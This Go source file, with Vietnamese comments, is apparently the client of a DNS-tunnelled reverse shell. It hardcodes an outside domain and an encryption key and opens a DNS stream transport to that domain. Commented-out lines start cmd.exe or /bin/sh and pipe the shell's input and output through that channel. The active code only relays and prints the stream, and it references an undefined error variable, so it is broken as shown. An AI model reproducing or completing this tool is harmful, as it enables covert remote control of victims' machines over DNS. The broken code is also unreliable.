package main

import (
	"bufio"
	"fmt"
	"ipwf/lib/transport"
	"os"
)

// khởi tạo 2 mảng chứa tên miền và encryptionKey
var (
	targetDomain  = "c.vimmo.app"
	encryptionKey = "80523fab733d2af60be251626a688ec9e4c9abb23e927edffa69b8bb0d0fa706"
)

func main() {
	// khởi tạo cmd bằng exec.Cmd của hệ thống
	// var cmd *exec.Cmd

	// // // kiểm tra nếu bằng window thì sử dụng cmd.exe
	// if runtime.GOOS == "windows" {
	// 	cmd = exec.Command("cmd.exe")
	// } else {
	// 	// nếu khác window thì sử dụng mặc định của unix
	// 	cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
	// }

	// khởi tạo dnsTransport bằng dữ liệu đã gói của DNSStream
	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)

	// // gán cho cmd.Stdout bằng dữ liệu của dnsTransport
	// cmd.Stdout = dnsTransport

	// // gán cho cmd.Stderr bằng dữ liệu của dnsTransport
	// cmd.Stderr = dnsTransport

	// // gán cho cmd.Stdin bằng dữ liệu của dnsTransport
	// cmd.Stdin = dnsTransport
	// cmd.Stdin = bufio.NewReader(os.Stdin)

	scanners := bufio.NewScanner(dnsTransport)
	// scanner.Text() = dnsTransport
	for scanners.Scan() {
		fmt.Println(scanners.Text())
	}

	if scanners.Err() != nil {
		// Handle error.
		fmt.Println(scanners.Err())

	}

	scanner := bufio.NewScanner(os.Stdin)
	// scanner.Text() = dnsTransport
	for scanner.Scan() {
		fmt.Println(scanner.Text())
	}

	if scanner.Err() != nil {
		// Handle error.
		fmt.Println(scanner.Err())

	}

	// // hiển thị dnsTransport để kiểm xoát thêm

	// //	khởi tạo err bằng cách chạy cmd.Run()
	// err := cmd.Run()

	// // nếu có lỗi sẽ trả về
	if err != nil {
		return
	}
}
